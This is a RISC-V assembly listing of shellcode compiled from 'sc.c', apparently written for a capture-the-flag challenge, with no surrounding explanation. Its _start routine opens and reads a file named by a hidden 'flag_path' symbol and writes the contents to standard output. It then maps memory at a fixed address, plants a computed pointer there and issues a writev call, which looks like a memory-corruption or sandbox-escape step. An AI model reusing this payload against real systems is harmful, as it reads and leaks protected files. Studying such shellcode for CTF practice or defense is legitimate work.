	.file	"sc.c"
	.option pic
	.text
	.align	1
	.globl	_start
	.type	_start, @function
_start:
	add	sp,sp,-1040
	li	a4,0
	li	a3,0
	lla	a2,flag_path
	li	a1,-100
	li	a0,56
	sd	ra,1032(sp)
	sd	s0,1024(sp)
	call	syscall@plt
	mv	s0,sp
	mv	a2,s0
	sext.w	a1,a0
	li	a3,1024
	li	a0,63
	call	syscall@plt
	mv	a2,s0
	li	a3,1024
	li	a1,1
	li	a0,64
	call	syscall@plt
	li	a1,1
	li	a6,0
	li	a5,-1
	li	a4,34
	li	a3,7
	li	a2,2097152
	sll	a1,a1,38
	li	a0,222
	call	syscall@plt
	li	a4,39247872
	add	a4,a4,1052
	li	a5,42270720
	add	a5,a5,a0
	add	a0,a0,a4
	sd	a0,-976(a5)
	li	a3,3
	li	a2,2
	li	a1,0
	li	a0,66
	call	syscall@plt
	ld	ra,1032(sp)
	ld	s0,1024(sp)
	add	sp,sp,1040
	jr	ra
	.size	_start, .-_start
	.globl	qwe
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align	3
.LC0:
	.string	"qweqwe"
	.section	.text,"aw",@progbits
	.align	3
	.type	qwe, @object
	.size	qwe, 8
qwe:
	.dword	.LC0
	.hidden	flag_path
	.ident	"GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0"
